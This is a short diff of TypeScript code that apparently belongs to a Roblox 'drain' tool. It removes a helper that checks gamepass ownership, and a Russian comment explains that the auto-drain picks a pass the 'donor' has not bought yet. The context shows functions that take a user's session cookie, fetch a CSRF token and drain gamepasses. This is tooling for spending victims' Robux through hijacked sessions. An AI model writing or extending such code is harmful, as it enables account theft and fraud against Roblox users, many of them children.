@@ -15,7 +15,7 @@ import { browserFailureMessage, getBrowserGamepassPreflight, getBrowserSession, 
 
 const ROBLOX_UA = { "User-Agent": "Roblox/WinInet", Accept: "application/json" };
 
-export interface DrainOutcome {
+interface DrainOutcome {
   success: boolean;
   msg: string;
   drained?: number;
@@ -76,21 +76,6 @@ export async function drainUserGamepasses(userId: number, cookie: string): Promi
   } catch { return []; }
 }
 
-/**
- * Владеет ли юзер геймпассом. Грабли «один пасс = один слив на донора»:
- * Roblox не даёт купить пасс повторно, поэтому автослив выбирает пасс,
- * которым донор ещё НЕ владеет. null = проверка не удалась (пасс пропускаем).
- */
-export async function ownsGamepass(userId: number, gpId: string): Promise<boolean | null> {
-  try {
-    const r = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/GamePass/${gpId}`, {
-      headers: ROBLOX_UA, signal: AbortSignal.timeout(8_000),
-    });
-    if (!r.ok) return null;
-    const d: any = await r.json().catch(() => null);
-    return Array.isArray(d?.data) ? d.data.length > 0 : null;
-  } catch { return null; }
-}
 
 async function getCsrf(cookie: string): Promise<string | null> {
   const r = await fetch("https://auth.roblox.com/v2/logout", {
